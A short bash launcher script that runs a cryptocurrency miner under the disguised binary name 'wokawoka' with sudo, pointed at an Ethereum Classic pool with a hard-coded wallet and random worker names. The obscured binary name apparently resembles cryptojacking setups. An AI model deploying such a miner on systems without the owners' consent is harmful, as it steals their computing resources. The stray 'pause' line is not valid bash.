#!/bin/bash

POOL=us-etc.2miners.com:1010
WALLET=0x663bDc4a1eDeCDDCe775862bBE859D6A84a72fB8
WORKER=$(echo $(shuf -i 1-4 -n 1)-FANNNY)

cd "$(dirname "$0")"

chmod +x ./wokawoka && sudo ./wokawoka -a etchash -o $POOL -u $WALLET.$WORKER -log
pause $@
